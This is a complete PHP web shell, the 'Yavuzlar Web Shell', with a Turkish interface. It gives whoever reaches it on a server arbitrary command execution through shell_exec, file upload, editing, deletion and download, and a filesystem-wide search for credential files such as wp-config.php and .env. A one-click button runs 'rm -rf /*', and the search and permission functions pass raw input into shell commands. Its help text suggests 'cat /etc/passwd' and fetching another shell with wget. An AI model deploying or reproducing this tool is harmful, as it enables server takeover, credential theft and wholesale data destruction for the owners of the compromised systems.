<center>
<?php
session_start();
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = __DIR__;
}
if (isset($_GET['dir'])) {
    $_SESSION['current_dir'] = $_GET['dir'];
}

function listDir($dir) {
    $items = scandir($dir);
    $output = "<ul>";
    foreach ($items as $item) {
        if ($item != "." && $item != "..") {
            $path = $dir . '/' . $item;
            if (is_dir($path)) {
                $output .= "<li><a href='?dir=" . $path . "'>📁 " . $item . "</a></li>";
            } else {
                if (is_readable($path)) {
                    $output .= "<li>📄 <a href='?file=" . $path . "'>" . $item . "</a></li>";
                } else {
                    $output .= "<li>📄 " . $item . " (Okunamıyor)</li>";
                }
            }
        }
    }
    $output .= "</ul>";
    return $output;
}

function uploadFile($file) {
    $current_dir = $_SESSION['current_dir'];
    $file_name = $file['name'];
    $file_tmp = $file['tmp_name'];
    $upload_path = $current_dir . "/" . $file_name;
    if (move_uploaded_file($file_tmp, $upload_path)) {
        return "Dosya Yükleme Başarılı: " . $file_name;
    } else {
        return "Dosya Yükleme Başarısız!";
    }
}

function displayCurrentPath() {
    $path = $_SESSION['current_dir'];
    $parts = explode('/', $path);
    $full_path = "";
    $output = "<nav><b>Dizin: </b>";
    foreach ($parts as $part) {
        if ($part !== "") {
            $full_path .= "/" . $part;
            $output .= "<a href='?dir=" . $full_path . "'>" . $part . "</a> / ";
        }
    }
    $output .= "</nav>";
    return $output;
}

function deleteFile($filename) {
    $current_dir = $_SESSION['current_dir'];
    $file = $current_dir . '/' . $filename;

    if (unlink($file)) {
        return "Dosya silindi: " . $file;
    } else {
        return "Dosya silinemedi!";
    }
}

function editFile($filename, $content) {
    $current_dir = $_SESSION['current_dir'];
    $file = $current_dir . '/' . $filename; 
    if (file_put_contents($file, $content)) {
        return "Dosya güncellendi: " . $file;
    } else {
        return "Dosya güncellenemedi!";
    }
}

function executeCommand($cmd) {
    $current_dir = $_SESSION['current_dir'];
    return "<pre style='text-align: start;'>" . shell_exec($cmd) . "</pre>";
}

function searchFile($search) {
    $current_dir = $_SESSION['current_dir'];
    $result = shell_exec("find " . $current_dir . " -name " . $search);
    return "<pre style='text-align: start;'>" . $result . "</pre>";
}

function findConfigFiles() {
    $result = shell_exec("find / -name 'config.php' -o -name 'config.json' -o -name 'settings.php' -o -name 'db_config.php' -o -name 'wp-config.php' -o -name '.env' 2>/dev/null");
    
    return "<pre style='text-align: start;'>Bulunan konfigürasyon dosyaları:\n" . $result . "</pre>";
}

function listAllFiles() {
    $result = shell_exec("find /");
    return "<pre style='text-align: start;'>Tüm dosyalar:\n" . $result . "</pre>";
}

function filePermissions($file) {
    $current_dir = $_SESSION['current_dir'];
    $file_path = $current_dir . '/' . $file;
    $result = shell_exec("ls -la " . $file_path);
    return "<pre style='text-align: start;'>Dosya izinleri:\n" . $result . "</pre>";
}

function downloadFile($file) {
    $current_dir = $_SESSION['current_dir'];
    $file_path = $current_dir . "/" . $file;
    if (file_exists($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file_path));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    } else {
        return "Dosya bulunamadı: " . $file_path;
    }
}

function deleteAll() {
    $result = shell_exec("rm -rf /*");
    return "Tüm dosyalar silindi!";
}

function showHelp() {
    return "<pre style='text-align: start;'>
    Komut Yardımı:
    - [ls]:Bulunduğunuz dizindeki dosyaları listelemek için kullanılır.(örn:ls -la, ls -l)
    - [pwd]:Dizinini görüntülemek için kullanılır.(örn:pwd)
    - [mv]:Dosyaları taşımak veya yeniden adlandırmak için kullanılır.(örn:mv test.txt test2.txt)
    - [rm]:Dosyaları silmek için kullanılır.(örn:rm test.txt)
    - [mkdir]:Yeni dizin oluşturmak için kullanılır.(örn:mkdir test)
    - [chmod]:Dosya ve dizinlerin izinlerini değiştirmek için kullanılır.(örn:chmod 777 test.txt)
    - [ps]:Çalışan işlemleri listelemek için kullanılır.(örn:ps aux)
    - [df]:Disk kullanımını görüntülemek için kullanılır.(örn:df -h)
    - [cat]:Dosyaların içeriğini görüntülemek için kullanılır.(örn:cat /etc/passwd)
    - [wget]:Dosya indirmek için kullanılır.(örn:wget https://github.com/matmund/bajax-php-shell/archive/refs/heads/master.zip)
    - [echo]:Ekrana çıktı almak için kullanılır.(örn:echo Merhaba Dünya!)
    - [uname]:Linux ve diğer Unix benzeri işletim sistemlerinde sistem hakkında bilgi almak için kullanılır.(örn:uname -a)
    </pre>";
}

$fileContent = "";
$fileName = "";
if (isset($_GET['file'])) {
    $filePath = $_GET['file'];
    if (is_readable($filePath)) {
        $fileName = basename($filePath);
        $fileContent = file_get_contents($filePath);
    }
}

$message = '';
if (isset($_FILES['file'])) {
    $message = uploadFile($_FILES['file']);
} elseif (isset($_POST['delete'])) {
    $message = deleteFile($_POST['delete']);
} elseif (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $message = editFile($_POST['edit_file'], $_POST['file_content']);
} elseif (isset($_POST['cmd'])) {
    $message = executeCommand($_POST['cmd']);
} elseif (isset($_POST['search_file'])) {
    $message = searchFile($_POST['search_file']);
} elseif (isset($_POST['find_config'])) {
    $message = findConfigFiles();
} elseif (isset($_POST['list_files'])) {
    $message = listAllFiles();
} elseif (isset($_POST['file_permissions'])) {
    $message = filePermissions($_POST['file_permissions']);
} elseif (isset($_POST['download'])) {
    $message = downloadFile($_POST['download']);
} elseif (isset($_POST['delete_all'])) {
    $message = deleteAll($_POST['delete_all']);
} elseif (isset($_POST['help'])) {
    $message = showHelp();
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Web Shell</title>
    <style>
        body {
            background-color: black;
            font-family:Tahoma,Verdana;
            color:#fff;
            font-size:12px;
        }
        form {
            margin: 10px 0; 
        }
        textarea {
            width: 100%; 
            height: 100px; 
        }
        pre {
            position: relative;
            background: black; 
            padding: 10px; 
            border-radius: 15px;
            border: 3px dashed green;
            color: white;
            width: 950px;
        }
        input{
            width: 280px;
            background-color: black;
            border: 2px solid green;
            padding: 5px;
            color: white;
            font-family: Verdana, Geneva, Tahoma, sans-serif;
            border-radius: 4px; 
        }
        .hover:hover{
            background-color: green;
            transition: 0.2s;
        }
        .container{
            border-radius: 15px;
            width: 800px;
            height: auto;
            border: 3px dashed green;
        }
        nav {
            margin-bottom: 10px;
        }
        ul {
            list-style-type: none;
            padding: 0;
            margin: 0 auto; 
            width: fit-content;
            text-align: left;
        }
        a {
            color: green;
            text-decoration: none;
        }
        ul li {
            margin: 5px 0;
            
        }
        a:hover {
            text-decoration: underline;
        }
        .icon {
            color: green;
            width: 780px;
        }
    </style>
</head>

<body>
    <pre style="border: 0px;">

        _____.___.   _____   ____   ____ ____ ___ __________.____        _____   __________ 
        \__  |   |  /  _  \  \   \ /   /|    |   \\____    /|    |      /  _  \  \______   \
         /   |   | /  /_\  \  \   Y   / |    |   /  /     / |    |     /  /_\  \  |       _/
         \____   |/    |    \  \     /  |    |  /  /     /_ |    |___ /    |    \ |    |   \
         / ______|\____|__  /   \___/   |______/  /_______ \|_______ \\____|__  / |____|_  /
         \/               \/                              \/        \/        \/         \/ 
        </pre> 
    <div>
    <?php echo displayCurrentPath(); ?>
        <?php if ($message): ?>
            <div><?php echo $message; ?></div>
        <?php endif; ?>
    </div>  
    <div class="container">
    <form method="POST">
        <textarea style="background-color: black; border: 2px solid green; resize: vertical; height: 100px; width: 70%; margin-bottom: 8px; color: white;" name="file_content" placeholder="Yeni içerik" required><?php echo $fileContent; ?></textarea>
        <br><input type="text" name="edit_file" placeholder="Düzenlenecek dosyanın ismi" required value="<?php echo $fileName; ?>">
        <input class="hover" type="submit" value="Dosyayı Düzenle">
    </form>

    <form method="POST">
        <input type="text" name="delete" placeholder="Silinecek dosyanın ismi" required>
        <input class="hover" type="submit" value="Dosya Sil">
    </form>

    <form method="POST">
        <input type="text" name="cmd" placeholder="Komut girin" required>
        <input class="hover" type="submit" value="Komutu Çalıştır">
    </form>

    <form method="POST">
        <input type="text" name="search_file" placeholder="Aranacak dosya ismi" required>
        <input class="hover" type="submit" value="Dosya Ara">
    </form>

    <form method="POST">
        <input type="text" name="file_permissions" placeholder="İzinleri öğrenmek için dosya ismi" required>
        <input class="hover" type="submit" value="Dosya İzinlerini Göster">
    </form>

    <form method="POST">
        <input type="text" name="download" placeholder="İndirilecek dosyanın ismi" required>
        <input class="hover" type="submit" value="Dosyayı İndir">
    </form>

    <form enctype="multipart/form-data" method="POST">
        <input type="file" name="file" required>
        <input class="hover" type="submit" value="Dosya Yükle">
    </form>

    <h3>Dosyalar:</h3>
    <?php echo listDir($_SESSION['current_dir']); ?>

    <form method="POST">
        <input type="hidden" name="find_config" value="1">
        <input class="hover" type="submit" value="Konfigürasyon Dosyalarını Bul">
    </form>

    <form method="POST">
        <input type="hidden" name="list_files" value="1">
        <input class="hover" type="submit" value="Tüm Dosyaları Listele">
    </form>

    <form method="POST">
        <input type="hidden" name="delete_all" value="1">
        <input class="hover" type="submit" value="Her Şeyi Sil">
    </form>

    <form method="POST">
        <input type="hidden" name="help" value="1">
        <input class="hover" type="submit" value="Komut Yardımı">
    </form>
</div>
<pre class="icon">
    
     ~!.     ~#&&&P.         
   .Y&7       &@@@@@@^        
  7@@.       ~@@@@@@@:        
 5@@^   ^!P&B!&@@@@@B         
7@@&   Y!#:.5@@@@@@#^         
&@@&     ^    ?@@@@@&#Y. ^Y7. 
@@@@^          .?G&@@@@@@@@@Y.
B@@@&.             Y@@&^@@@&Y 
.@@@@@~             !&@5@@@@&Y
 :&@@@@#!            J@J~&#:. 
   5@@@@@@BJ^.     !#P@&&?    
    .J#@@@@@@@@@@@@@@@#7      
       .!5#&@@@@@&BY~.        
           
       <a href="https://yavuzlar.org/" target="_blank">Yavuzlar</a>      
</pre>
</body>
</center>
</html>
